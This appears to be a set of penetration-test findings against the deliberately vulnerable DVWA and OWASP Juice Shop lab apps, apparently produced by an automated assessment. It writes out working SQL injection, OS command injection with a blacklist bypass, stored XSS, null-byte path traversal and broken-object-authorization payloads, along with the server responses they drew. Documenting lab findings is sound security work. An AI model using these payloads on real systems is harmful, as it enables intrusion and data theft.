findings.title: SQL Injection via unsanitized 'id' parameter in SQLi page [security=low]
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned 5 rows spanning the full seeded users table: (admin/admin), (Gordon/Brown), (Hack/Me), (Pablo/Picasso), (Bob/Smith) — i.e. multiple distinct seeded surnames returned by a boolean-always-true clause. FALSE payload id=1' AND '1'='2 returned the page with no 'ID:'/'First name:'/'Surname:' records at all (empty result set, only the static 'User ID:' label present). This TRUE-returns-many / FALSE-returns-none behavior confirms the query is not parameterized and string concatenation of the raw id value into the SQL statement is exploitable.

findings.title: OS Command Injection via pipe (no trailing space) bypasses high-security blacklist on DVWA exec page
request_sequence: GET http://dvwa/vulnerabilities/exec/ (session=dvwa_admin) -> confirms page text 'Security Level: high', form fields ip/Submit
findings.response_evidence: [security=high] At high security level (page explicitly shows 'Security Level: high'), submitting ip=127.0.0.1|whoami (pipe with NO trailing space, bypassing the high-level blacklist of '; ', '| ', and '&&') to POST /vulnerabilities/exec/ produced command output containing the literal string 'www-data' in the rendered <pre> block: pre_blocks=["www-data"], and visible_text snippet '...Enter an IP address: www-data More Information...'. This confirms the web server process identity leaked via injected whoami command, proving OS command injection at high security.

findings.title: Stored XSS via unsanitized 'mtxMessage' guestbook field [security=low]
request_sequence: POST http://dvwa/vulnerabilities/xss_s/ form_data={txtName: 'tester', mtxMessage: '<script id=\"test_token\">window.xss_flag=1</script>', btnSign: 'Sign Guestbook'} (session=dvwa_admin)
findings.response_evidence: [security=low] POST succeeded (HTTP 200) and the guestbook page subsequently listed a new entry 'Name: tester' confirming the record was persisted despite the client-side maxlength=50 restriction being bypassed via direct POST (payload is 53 chars). The injected <script id="test_token"> tag was stored unescaped and rendered server-side without encoding.
findings.browser_js_evidence: browser_eval_js("window.xss_flag") returned 1 after navigating to the rendering page in an authenticated browser session, and browser_read_dom("#test_token") returned inner_text/inner_html "window.xss_flag=1", confirming the injected <script> element executed in the DOM and set the global flag, proving genuine stored XSS (not merely reflected text).

findings.title: SQL Injection via numeric boolean payload bypasses medium-level quote escaping (DVWA /vulnerabilities/sqli/)
findings.response_evidence: [security=medium] TRUE payload id='1 OR 1=1' returned 5 seeded user rows: (admin/admin), (Gordon/Brown), (Hack/Me), (Pablo/Picasso), (Bob/Smith) — confirming the injected OR condition matched all rows in the users table rather than a single id lookup. FALSE payload id='1 AND 1=2' returned zero rows (visible_text shows only the dropdown/header, no 'ID:' result blocks, no pre_blocks). Page banner confirms 'Security Level: medium' in both responses. This confirms numeric-boolean based SQLi bypasses the medium-level quote-escaping mitigation (mysqli_real_escape_string only neutralizes quote characters, not numeric boolean logic injected into the unparenthesized WHERE clause).

findings.title: SQL Injection via out-of-band session-input.php id parameter with trailing comment bypasses LIMIT 1 at high security
request_sequence: POST http://dvwa/vulnerabilities/sqli/session-input.php (session=dvwa_admin) body: id=1' OR '1'='1' #&Submit=Submit  (sets session id to TRUE boolean payload)
GET http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin) -> renders query results using stored session id
POST http://dvwa/vulnerabilities/sqli/session-input.php (session=dvwa_admin) body: id=1' AND '1'='2' #&Submit=Submit  (sets session id to FALSE boolean payload)
GET http://dvwa/vulnerabilities/sqli/ (session=dvwa_admin) -> renders query results using stored session id
findings.response_evidence: [security=high] Page confirms 'Security Level: high' and that /vulnerabilities/sqli/ itself has no inline id form ('Click here to change your ID' link only), proving id must be set out-of-band via session-input.php before the server-side query (which appends LIMIT 1) executes. TRUE payload id=1' OR '1'='1' # produced 5 full seeded user records rendered in <pre> blocks: ID: 1' OR '1'='1' # / First name: admin / Surname: admin; First name: Gordon / Surname: Brown; First name: Hack / Surname: Me; First name: Pablo / Surname: Picasso; First name: Bob / Surname: Smith. Immediately after, FALSE payload id=1' AND '1'='2' # produced a page with zero <pre> result blocks (visible_text only shows the 'Click here to change your ID' link, no First name/Surname entries). This TRUE(multiple records)/FALSE(zero records) differential with the required trailing '#' comment (to neutralize the appended LIMIT 1) confirms boolean-based SQL injection at high security.

findings.title: Cross-User Basket Access (BOLA) - acct2 can read acct1's basket
request_sequence: GET http://juiceshop:3000/rest/basket/6 (session=juiceshop_acct1) -> 200, confirms own_basket_id=6, UserId=22, Products=[{name:'Apple Juice (1000ml)', BasketItem:{quantity:3}}]
GET http://juiceshop:3000/rest/basket/6 (session=juiceshop_acct2, own_basket_id=7) -> 200, returns IDENTICAL basket data belonging to UserId=22 (acct1), including Apple Juice (1000ml) qty=3
findings.response_evidence: acct1 session_info confirms own_basket_id=6; GET /rest/basket/6 as acct1 returns {"id":6,"UserId":22,"Products":[{"name":"Apple Juice (1000ml)","BasketItem":{"quantity":3,"BasketId":6}}]}. When authenticated as juiceshop_acct2 (whose own_basket_id is 7, a different user), the SAME request GET /rest/basket/6 returns HTTP 200 with the identical basket payload belonging to UserId:22 (acct1), including the distinct seeded product "Apple Juice (1000ml)" with quantity 3. No ownership/authorization check is enforced - acct2's bearer token is accepted to retrieve acct1's private basket resource by ID. This confirms a Broken Object Level Authorization (BOLA) vulnerability.

findings.title: Authentication Bypass via SQL Injection on Login
findings.response_evidence: Response body: {\"authentication\":{\"token\":\"[JWT]\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}. The injected email field `' OR 1=1--` comments out the password check in the backend SQL query, causing the query to match the first user record in the table. The server returns HTTP 200 with a valid authentication JWT token and `umail` field explicitly resolving to \"admin@juice-sh.op\" (the first seeded user), confirming successful authentication bypass without knowledge of valid credentials. `bid:1` also indicates basket id 1 was assigned corresponding to the admin account, consistent with prior BOLA observation that basket 1 belongs to UserId 1 (admin).

findings.title: SQL Injection in Product Search Endpoint
findings.response_evidence: First request (single quote q=qwert') returns HTTP 500 with body: \"Error: SQLITE_ERROR: near \\\"'%'\\\": syntax error\" - this confirms the `q` parameter is concatenated directly into a raw SQL query without sanitization, causing a database syntax error and leaking the underlying SQLITE_ERROR and query structure. Second request using a 9-column UNION-based payload (`x')) UNION SELECT 1,2,3,4,5,6,7,8,9--`) returns HTTP 200 with body: {\"status\":\"success\",\"data\":[{\"id\":1,\"name\":2,\"description\":3,\"price\":4,\"deluxePrice\":5,\"image\":6,\"createdAt\":7,\"updatedAt\":8,\"deletedAt\":9}]} - the literal integers 1-9 supplied in the UNION SELECT are reflected directly into the JSON response fields (name:2, description:3, etc.), proving the injected UNION query was executed successfully against the database and its column count/structure was inferred correctly, demonstrating full SQL injection capability (including potential for arbitrary data exfiltration via UNION).

findings.title: Open Directory Listing on /ftp/ exposes confidential acquisitions.md memo
findings.response_evidence:
Step 1: GET /ftp/ returned HTTP 200 with a browsable directory index (serve-index style) listing files including 'acquisitions.md 909', 'announcement_encrypted.md', 'coupons_2013.md.bak', 'eastere.gg', 'encrypt.pyc', 'incident-support.kdbx', 'legal.md', 'package.json.bak', 'suspicious_errors.yml' — confirming an open directory listing with no authentication required.
Step 2: GET /ftp/acquisitions.md returned HTTP 200, content-type text/markdown, with body beginning: '# Planned Acquisitions

> This document is confidential! Do not distribute!

Our company plans to acquire several competitors within the next year. This will have a significant stock market impact...'. This verbatim confidential memo excerpt confirms the open directory listing discloses a sensitive internal document to unauthenticated users.

findings.title: Unauthenticated /api/Feedbacks returns only masked email fragments, not full PII
findings.response_evidence: GET /api/Feedbacks returned HTTP 200 (unauthenticated) with 8 feedback records. However, the email fragments embedded in the free-text 'comment' field are asterisk-masked by the application itself prior to storage/display, e.g.: comment id=1: 'I love this shop! Best products in town! Highly recommended! (***in@juice-sh.op)'; id=2: '(***@juice-sh.op)'; id=3: '(***der@juice-sh.op)'; id=4: '(***ereum@juice-sh.op)'. No record in the response contains a complete, unmasked email address — only the domain suffix and a few trailing characters of the local-part are visible, with the rest replaced by literal '***'. Because the verification criterion requires the endpoint to disclose actual author email addresses (PII) and the only email-like strings returned are irreversibly masked fragments rather than full addresses, this does not meet the confirmation bar for unauthenticated PII exposure via this endpoint. Marking as rejected (the underlying records exist but the exposed data is not a usable/complete email address).

findings.title: Exposed Encryption Keys Directory Listing at /encryptionkeys/
findings.response_evidence: HTTP 200 response with content_type text/html; charset=utf-8. Body is a serve-index directory listing containing: 'listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM'. Links enumerated: http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key, confirming the directory is browsable and exposes sensitive key material (JWT public key and premium feature private key) without authentication.

findings.title: Poison Null-Byte Path Traversal bypasses extension allowlist filter on /ftp/ to retrieve package.json.bak
findings.response_evidence: Step 1: GET /ftp/package.json.bak directly returns HTTP 403 with body 'Error: Only .md and .pdf files are allowed!' thrown from fileServer.js verify() extension-allowlist check (stack trace confirms /juice-shop/build/routes/fileServer.js:55:18). Step 2: GET /ftp/package.json.bak%2500.md (URL-encoded null byte '%2500' decoding to a null terminator followed by allowed extension '.md') returns HTTP 200, content_type application/octet-stream, with body being the actual restricted package.json backup file content: '{\n  \"name\": \"juice-shop\",\n  \"version\": \"6.2.0-SNAPSHOT\", ... \"dependencies\": {...} ...}' — i.e. the full package.json contents are disclosed despite the .bak extension filter, proving the null-byte bypass defeats the allowlist check and serves the restricted backup file.
